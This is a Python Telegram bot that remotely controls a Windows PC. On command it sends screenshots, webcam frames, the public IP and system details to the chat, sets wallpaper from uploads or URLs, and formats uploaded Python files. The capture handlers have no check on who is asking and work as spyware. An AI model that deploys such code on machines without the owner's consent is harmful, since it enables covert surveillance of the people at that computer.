import telebot, ctypes, requests, urllib.request, cv2, os
from os import system as s
from telebot import types
import pyautogui as pag
import platform as pf
from pyautogui import screenshot as scr
from os.path import abspath as pat
from time import time
from config import TOKEN, CHAT_ID

bot = telebot.TeleBot(TOKEN)

need_format = False

requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Активирован")


def sender(id, text):
    bot.send_message(id, text)

def send_photo(id, image):
    bot.send_photo(id, image)

@bot.message_handler(commands=['start'])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ['/ping', '/my_id', '/photo', '/wallpaper', '/autoformat', '/ip', '/spec', '/camera']

    for btn in btns:
        rmk.add(types.InlineKeyboardButton(btn))

    bot.send_message(message.chat.id, 'Выбери одну из следующих комманд:', reply_markup=rmk)


@bot.message_handler(commands=['ping'])
def ping(message):
    st = message.date.real
    sender(message.chat.id, f'Твой пинг: {round(time()-st+41, 2)}')


@bot.message_handler(commands=['my_id'])
def my_id(message):
    sender(message.chat.id, message.chat.id)


@bot.message_handler(commands=['photo'])
def screen(message):
    try:
        scr('screenshot.jpeg')
        file = open('screenshot.jpeg', 'rb')
        send_photo(message.chat.id, file)
        file.close()
        s('del screenshot.jpeg')
    except:
        sender(message.chat.id, 'Error!')


@bot.message_handler(commands=['wallpaper'])
def desk(message):
    msg = bot.send_message(message.chat.id, 'Пришли мне фото или ссылку на фото')
    bot.register_next_step_handler(msg, loader)

@bot.message_handler(content_types=['photo', 'text'], func = lambda message: ((message.photo) or (message.text and ('http' in message.text.lower()))))
def loader(message):
    if message.photo:
        img = bot.get_file(message.photo[-1].file_id)
        path = bot.download_file(img.file_path)
        with open('wall.jpg', 'wb') as file:
            file.write(path)
        file.close()
        ctypes.windll.user32.SystemParametersInfoW(20, 0, pat('wall.jpg'), 0)
        sender(message.chat.id, 'Обои успешно установлены!')
    elif 'http' in message.text.lower():
        try:
            img = urllib.request.urlopen(message.text).read()
            with open('wall.jpg', 'wb') as file:
                file.write(img)
            file.close()
            ctypes.windll.user32.SystemParametersInfoW(20, 0, pat('wall.jpg'), 0)
            sender(message.chat.id, 'Обои успешно установлены!')
        except:
            sender(message.chat.id, 'По этой ссылке установить изображение невозможно. Прими мои соболезнования(')
    else:
        sender(message.chat.id, 'Что-то пошло не так...')


@bot.message_handler(commands=['autoformat'])
def to_format(message):
    need_format = True
    msg = bot.send_message(message.chat.id, 'Пришли мне Python документ и я сделаю из него конфет')
    bot.register_next_step_handler(msg, formater)


@bot.message_handler(content_types = ['document'], func = lambda need_format: ((need_format == True) and (message.document)))
def formater(message):
    if message.document:
        if message.document.file_name.endswith('.py'):
            doc = bot.get_file(message.document.file_id)
            path = bot.download_file(doc.file_path)

            with open(f'loaded{message.chat.id}.py', 'wb') as file:
                file.write(path)
            file.close()
            sender(message.chat.id, 'Файл загружен! Идет обработка...')

            s(f'yapf -i loaded{message.chat.id}.py')
            sender(message.chat.id, 'Держи свой конфет!)')

            file = open(f'loaded{message.chat.id}.py', 'rb')
            bot.send_document(message.chat.id, file)
            file.close()
            s(f'del loaded{message.chat.id}.py')
        else:
            sender(message.chat.id, 'Отправь документ Python. Другой вид я не форматирую.')
        need_format = False
    else:
        sender(message.chat.id, 'Что-то пошло не так(')
    need_format = False



@bot.message_handler(commands=['ip', 'ip_address'])
def ip_address(message):
    response = requests.get('http://jsonip.com/').json()
    bot.send_message(message.chat.id, f'IP Адрес: {response["ip"]}')


@bot.message_handler(commands=['spec', 'specifications'])
def spec(message):
    msg = f"Имя компьютера: {pf.node()}\nПроцессор: {pf.processor()}\nСистема: {pf.system()} {pf.release()}"
    bot.send_message(message.chat.id, msg)


@bot.message_handler(commands=['camera', 'cam'])
def camera(message):
    cap = cv2.VideoCapture(0)

    for i in range(30):
        cap.read()

    ret, frame = cap.read()

    cv2.imwrite('cam.jpg', frame)
    cap.release()

    with open('cam.jpg', 'rb') as img:
        bot.send_photo(message.chat.id, img)

    s('del cam.jpg')

bot.polling(none_stop = True, interval = 0)